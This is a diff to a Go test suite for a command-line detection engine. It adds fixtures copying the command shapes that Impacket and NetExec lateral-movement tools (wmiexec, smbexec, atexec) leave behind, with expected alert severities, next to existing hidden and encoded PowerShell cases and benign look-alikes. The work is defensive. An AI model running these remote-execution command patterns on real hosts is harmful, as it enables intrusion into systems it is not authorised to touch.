@@ -69,6 +69,15 @@ func TestCommandLineRulesFire(t *testing.T) {
 		{"hidden bypass", "powershell.exe", `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\x.ps1`, "exec.powershell_hidden", SevNotable},
 		{"frombase64", "powershell.exe", `powershell -c "$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aGVsbG8='))"`, "exec.frombase64", SevNotable},
 		{"undecodable payload still reported", "powershell.exe", "powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/////////w", "exec.powershell_encoded", SevSuspect},
+		// Impacket and NetExec, in the shapes their source builds.
+		{"impacket wmiexec", "cmd.exe", `cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1698765432.1234567 2>&1`, "lateral.wmiexec", SevCritical},
+		{"impacket dcomexec", "cmd.exe", `"C:\Windows\System32\cmd.exe" /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__16987 2>&1`, "lateral.wmiexec", SevCritical},
+		{"netexec wmiexec", "cmd.exe", `cmd.exe /Q /c ipconfig /all 1> \Windows\Temp\aBc12x 2>&1`, "lateral.wmiexec", SevCritical},
+		{"netexec wmiexec fileless", "cmd.exe", `cmd.exe /Q /c whoami 1> \\10.0.0.66\SHARE\kTyQpw 2>&1`, "lateral.wmiexec", SevCritical},
+		{"impacket smbexec service", "", `%COMSPEC% /Q /c echo whoami ^> \\%COMPUTERNAME%\C$\__output_AbCdEfGh 2^>^&1 > %SYSTEMROOT%\qWeRtYuI.bat & %COMSPEC% /Q /c %SYSTEMROOT%\qWeRtYuI.bat & del %SYSTEMROOT%\qWeRtYuI.bat`, "lateral.smbexec", SevCritical},
+		{"smbexec as started", "cmd.exe", `C:\Windows\system32\cmd.exe /Q /c echo whoami ^> \\HOST\C$\xYzAbC 2^>^&1 > C:\Users\a\AppData\Local\Temp\abcdef.bat & C:\Windows\system32\cmd.exe /Q /c C:\Users\a\AppData\Local\Temp\abcdef.bat & C:\Windows\system32\cmd.exe /Q /c del C:\Users\a\AppData\Local\Temp\abcdef.bat`, "lateral.smbexec", SevCritical},
+		{"impacket atexec task", "cmd.exe", `cmd.exe /C whoami > %windir%\Temp\AbCdEfGh.tmp 2>&1`, "lateral.atexec", SevCritical},
+		{"atexec as started", "cmd.exe", `C:\Windows\system32\cmd.exe /C net user > C:\Windows\Temp\qWeRtYuI.tmp 2>&1`, "lateral.atexec", SevCritical},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
@@ -101,6 +110,9 @@ func TestCommandLineRulesStayQuiet(t *testing.T) {
 		{"bcdedit.exe", `bcdedit /set {current} recoveryenabled yes`},
 		{"wevtutil.exe", `wevtutil qe Security /c:5`},
 		{"cmd.exe", `cmd.exe /c echo hello`},
+		{"cmd.exe", `cmd.exe /c build.bat > C:\logs\build.log 2>&1`},
+		{"cmd.exe", `cmd.exe /Q /c dir 1> C:\Users\me\out.txt 2>&1`},
+		{"cmd.exe", `cmd /c del %windir%\Temp\setup.tmp > nul 2>&1`},
 		{"rundll32.exe", `C:\Windows\system32\rundll32.exe C:\Windows\system32\shell32.dll,Control_RunDLL`},
 		{"regsvr32.exe", `regsvr32 /s C:\Program Files\Acme\acme.dll`},
 		{"dotnet.exe", `dotnet run --project .net user /addon`},
